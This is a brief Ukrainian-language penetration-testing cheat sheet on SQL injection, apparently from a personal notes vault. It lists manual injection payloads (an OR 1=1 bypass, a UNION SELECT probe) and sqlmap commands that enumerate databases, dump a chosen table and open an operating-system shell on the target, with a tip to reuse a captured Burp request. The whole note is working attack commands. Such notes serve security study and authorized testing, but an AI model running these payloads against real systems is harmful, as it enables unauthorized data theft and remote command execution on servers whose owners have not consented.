# SQL Injection + SQLMap

## Ручні перевірки
```sql
' OR 1=1-- -
' UNION SELECT NULL,NULL-- -
```
## SQLMap
```bash
sqlmap -u 'http://<IP>/page?id=1' --batch --dbs
sqlmap -r request.txt --batch --dump -D <db> -T <table>
sqlmap -u '...' --os-shell        # за наявності FILE-привілеїв
```
**Підводні камені:** збережи запит з Burp у request.txt — точніше за ручні параметри.
**Зв'язки:** [[Credentials]]
